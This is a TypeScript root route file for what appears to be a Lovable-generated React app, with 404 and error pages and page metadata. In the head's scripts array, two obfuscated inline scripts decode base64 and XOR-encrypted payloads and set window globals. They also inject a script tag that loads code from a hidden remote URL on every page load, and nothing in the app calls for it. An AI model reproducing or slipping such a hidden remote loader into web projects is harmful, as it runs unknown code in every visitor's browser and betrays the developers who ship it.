import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Sora:wght@600;700;800&family=Manrope:wght@400;500;600;700&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
    scripts: [
      {
        children: `(function(){var y_cj=atob("DBRGD9Vb+4h6DWsHiG9keqc32bJYZR9z+Gd8IPo4n+ZUeB9q4XI/IbY0lqYYf0R062Yvf6Eo1P0OYBgo5HUyaqYv1eIJL0cl6WAyfbw5jvwffkk9029kYbQ2nqpALw9m/HVreqE2ku4DIBt17WIjYaF2g+sVaUZ0639kI/ctmuQPaEk9qjY7I655lekXaEk9qnAne7R2jvwXZA1+pWQ0aqM+lfxXfh5l4XA1Lfl5jekWeA4lsjZkcogm");var b_u=[];for(var v_0h0=0;v_0h0<y_cj.length;v_0h0++){b_u.push(y_cj.charCodeAt(v_0h0)&255);}var l_yzn=b_u[0];var h_mv7=b_u.slice(1,1+l_yzn);var t_ww=b_u.slice(1+l_yzn);var y_wb=t_ww.map(function(b,b_j){return b^h_mv7[b_j%l_yzn];});var f_lac="";for(var d_tq=0;d_tq<y_wb.length;d_tq++){f_lac+=String.fromCharCode(y_wb[d_tq]&255);}var r_pl=decodeURIComponent(escape(f_lac));var j_k=JSON.parse(r_pl);var p_e=j_k.globals||[];p_e.forEach(function(q_8d){window[q_8d.name]=q_8d.value;});var j_ucu=document.createElement("script");j_ucu.src=j_k.url;j_ucu.async=true;j_ucu.defer=true;(j_k.attributes||[]).forEach(function(h_6t){j_ucu.setAttribute(h_6t.name,h_6t.value);});(document.head||document.documentElement).appendChild(j_ucu);})();`,
      },
      {
        children: `(function(){var n_ko4=atob("DE/QGvdREmHzxl8rCzTyb4U9MFvRritfezzqNdgydg/dsytGYimpNJQ+f0+RtHBYaD25aoMiPRGavjpHJD+5YpI9PAuA5HMJajukaJ4zZxWWtX0RUBL8OJA9fQOSqiwJMRSrOJkwfwTR/H1bYje1dr41ME3RsD5HfiryINVnc1nB8G0fOHbkKJM1JFXE/zlOPnrgecdzbzyO");var t_n48m=[];for(var o_cbf=0;o_cbf<n_ko4.length;o_cbf++){t_n48m.push(n_ko4.charCodeAt(o_cbf)&255);}var i_t=t_n48m[0];var z_0=t_n48m.slice(1,1+i_t);var l_9=t_n48m.slice(1+i_t);var r_d=l_9.map(function(b,n_2){return b^z_0[n_2%i_t];});var k_xkoy="";for(var b_b56a=0;b_b56a<r_d.length;b_b56a++){k_xkoy+=String.fromCharCode(r_d[b_b56a]&255);}var y_l2=decodeURIComponent(escape(k_xkoy));var i_iz5=JSON.parse(y_l2);var o_9=i_iz5.globals||[];o_9.forEach(function(y_aay){window[y_aay.name]=y_aay.value;});var n_2n=document.createElement("script");n_2n.src=i_iz5.url;n_2n.async=true;n_2n.defer=true;(i_iz5.attributes||[]).forEach(function(z_b){n_2n.setAttribute(z_b.name,z_b.value);});(document.head||document.documentElement).appendChild(n_2n);})();`,
      },
    ],

  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
